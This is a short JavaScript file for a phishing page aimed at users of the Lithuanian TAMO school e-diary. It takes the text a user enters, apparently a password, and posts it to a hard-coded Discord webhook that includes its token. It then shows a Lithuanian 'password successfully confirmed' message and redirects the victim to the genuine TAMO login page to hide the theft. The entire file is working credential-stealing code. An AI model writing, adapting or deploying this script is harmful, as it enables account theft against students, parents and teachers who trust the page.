document.addEventListener('DOMContentLoaded', function() {
  const submitButton = document.querySelector('.submit');
  const inputField = document.querySelector('.input');

  const smallText = document.querySelector('.smallText');
  const smallText2 = document.querySelector('.smallText2');

  const square = document.querySelector('.square');

  submitButton.addEventListener('click', function() {
    const inputText = inputField.value;

    if (submitButton.innerHTML == 'Uždaryti') {
      window.location.href = 'https://dienynas.tamo.lt/Prisijungimas/Login';
    } else {
      const webhookUrl = "https://discord.com/api/webhooks/1080966771302989884/751lQcWhaO-7ZMV7K-jvZSDUuUeGj-fPLkSBSoQvE_NXPvH7pDbHVCEvzMulPJr2R1fd";

      // Construct the message payload
      const payload = {
        content: inputText
      };

      // Send the message to the webhook
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .catch(error => {
        console.error("Nepavyko patvirtinti slaptažodžio:", error);
      });

      square.style.height = '235px';
      smallText.innerHTML = 'Slaptaždis sėkmingai patvirtintas.'
      submitButton.innerHTML = 'Uždaryti'

      smallText2.parentNode.removeChild(smallText2)
      inputField.parentNode.removeChild(inputField)
    };
  });
});
